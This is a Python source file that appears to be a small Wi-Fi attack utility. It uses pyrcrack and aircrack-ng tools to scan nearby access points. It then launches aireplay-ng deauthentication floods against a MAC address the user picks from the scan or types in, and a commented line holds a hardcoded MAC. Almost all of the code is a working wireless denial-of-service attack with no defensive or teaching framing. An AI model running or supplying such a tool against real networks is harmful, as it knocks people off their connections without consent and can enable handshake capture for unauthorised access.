import asyncio

import pyrcrack
import subprocess as sp
from rich.console import Console
from rich.prompt import Prompt



async def scan():
    global res
    console = Console()
    console.clear()
    console.show_cursor(True)
    airmon = pyrcrack.AirmonNg()

    interface = (await airmon.interfaces)[0]

    c = 0
    async with airmon(interface) as mon:
        async with pyrcrack.AirodumpNg() as pdump:
            async for result in pdump(mon.monitor_interface):
                console.clear()
                console.print(result.table)
                
                await asyncio.sleep(0.5)
                c += 1
                if c == 30:
                    res = (result.table)
                    break
    
    Prompt.ask('Press [ENTER] to exit')
    

async def _scan():
    airmon = pyrcrack.AirmonNg()
    console = Console()

    interface = (await airmon.interfaces)[0]
    
    res = None
    c = 0
    async with airmon(interface) as mon:
        async with pyrcrack.AirodumpNg() as pdump:
            async for result in pdump(mon.monitor_interface):
                console.clear()
                console.print(result.table)
                
                await asyncio.sleep(0.5)
                c += 1
                if c == 20:
                    res = (result.table)
                    break
    
    if res != None:
        return res
    


async def _deauth(mac="", dur=30):
    airmon = pyrcrack.AirmonNg()
    interface = (await airmon.interfaces)[0]
    

    async with airmon(interface) as mon:
        aireplay = sp.Popen(["aireplay-ng", "--deauth", f"{dur}", "-a", mac, "-D", str(mon.monitor_interface)], stdin=sp.PIPE)
        await asyncio.sleep(10)
        aireplay.terminate()
        
    
    

async def auto_deauth():
    console = Console()
    console.clear()
    console.show_cursor(True)
    
    targets = await _scan()
    
    console.clear()
    console.print(targets)
    
    ans = int(Prompt.ask("[target]"))-1
    
    devs = list(targets.columns[1]._cells)
    target = devs[ans]
    
    console.clear()
    
    console.print(f"\nDeauthenticating {target}", style="bold")
    
    await _deauth(str(target))
    # await _deauth("A4:D9:90:D5:76:C3")
    
    Prompt.ask("\n[ENTER]")
    

async def man_deauth():
    console = Console()
    console.clear()
    console.show_cursor(True)
    
    
    target = Prompt.ask("\n(DeAuth) TARGET MAC")
    dur = Prompt.ask("\n(DeAuth) DURATION [30s]", default="30")
    
    
    console.clear()
    
    console.print(f"\nDeauthenticating {target}", style="bold")
    
    await _deauth(mac=target, dur=dur)
    
    Prompt.ask("\n[ENTER]")
    

